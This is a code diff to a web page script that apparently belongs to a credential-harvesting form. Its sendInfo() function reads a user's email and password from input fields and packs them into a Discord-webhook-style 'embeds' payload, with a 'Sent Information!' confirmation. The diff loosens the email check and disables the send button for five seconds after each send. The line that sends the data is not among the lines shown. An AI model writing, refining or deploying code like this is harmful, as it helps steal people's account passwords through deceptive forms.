@@ -7,16 +7,11 @@ function discord() {
     window.open("https://discord.gg/qtkeqQUCGv", "_blank");
 }
 
-function isValidEmail(email) {
-    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return regex.test(email);
-}
-
 function sendInfo() {
     const password = document.getElementById("password").value;
     const email = document.getElementById("email").value;
     const mainBTN = document.getElementById("join");
-    if (isValidEmail(email)) {
+    if (email.includes("@") && email.includes(".")) {
         const payload = {
             embeds: [
             {
@@ -38,12 +33,14 @@ function sendInfo() {
         mainBTN.textContent = "Sent Information!"
         mainBTN.style.background = "#43A047";
         mainBTN.style.width = "200px";
+        mainBTN.disabled = true;
         mainBTN.style.boxShadow = "0 0 10px 2px #43A047";
         setTimeout(() => {
             mainBTN.textContent = "Send!"
             mainBTN.style.background = "";
             mainBTN.style.width = "";
             mainBTN.style.boxShadow = "";
+            mainBTN.disabled = false;
         }, 5000);
     }
     else {
@@ -51,11 +48,13 @@ function sendInfo() {
         mainBTN.style.background = "#D32F2F";
         mainBTN.style.width = "180px";
         mainBTN.style.boxShadow = "0 0 10px 2px #D32F2F";
+        mainBTN.disabled = true;
         setTimeout(() => {
             mainBTN.textContent = "Send!"
             mainBTN.style.background = "";
             mainBTN.style.width = "";
             mainBTN.style.boxShadow = "";
+            mainBTN.disabled = false;
         }, 5000); 
     }
 }
